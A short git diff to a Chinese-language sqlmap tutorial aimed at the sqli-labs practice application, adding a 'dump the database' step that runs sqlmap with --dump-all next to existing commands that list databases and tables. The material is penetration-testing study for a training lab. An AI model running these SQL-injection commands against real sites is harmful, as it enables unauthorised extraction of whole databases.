@@ -37,6 +37,10 @@ sqlmap -u "http://xxx/sqli/Less-1/?id=1" --current-db
 sqlmap -u "http://xxx/sqli/Less-1/?id=1" -D security --tables
 ```
 
+脱裤
+```
+sqlmap -u "http://xxx/sqli/Less-1/?id=1" --dump-all
+```
 
 ## **对于需要登录的网站，我们需要指定其cookie**
 
